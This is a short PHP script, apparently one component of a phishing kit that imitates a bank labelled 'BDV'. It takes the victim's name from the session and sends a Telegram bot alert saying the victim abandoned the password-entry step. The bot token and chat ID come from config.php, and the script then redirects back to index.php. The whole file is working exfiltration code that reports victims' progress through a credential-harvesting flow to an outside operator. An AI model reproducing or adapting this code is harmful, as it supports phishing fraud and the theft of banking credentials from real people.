<?php
// Iniciar sesión para acceder a las variables de sesión
session_start();

// Incluir la configuración de Telegram
include('config.php');

// Verifica si el nombre está almacenado en la sesión, si no, usa 'Desconocido'
$nombre = isset($_SESSION['nombre']) ? $_SESSION['nombre'] : 'Desconocido';

// Mensaje que será enviado a Telegram
$message = "BDV\n👤Nombre: " . $nombre . "\nCancelo proceso de CONTRASEÑA. 🚫🔒🚫🔒🚫🔒";

// Enviar mensaje a Telegram usando file_get_contents
$telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
$response = file_get_contents($telegramApiUrl);

// Redirige después de enviar el mensaje
header('Location: index.php'); // Redirige a la página que deseas después de enviar el mensaje
exit();
?>
